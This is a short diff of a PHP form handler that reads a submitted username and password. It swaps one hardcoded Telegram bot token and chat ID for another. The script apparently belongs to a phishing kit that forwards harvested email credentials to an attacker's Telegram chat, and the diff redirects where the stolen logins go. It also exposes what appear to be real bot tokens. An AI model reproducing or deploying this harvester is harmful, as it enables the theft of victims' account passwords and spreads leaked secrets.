@@ -6,8 +6,8 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 
 date_default_timezone_set('UTC');
 
-$botToken = '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY';
-$chatId   = '1325797388';
+$botToken = '8093851911:AAEyrP0mC_P-G3OrO7yV8CG5jlfUp7Hp9qA';
+$chatId   = '5666631780';
 
 $email = trim($_POST['username'] ?? '');
 $password = trim($_POST['password'] ?? '');
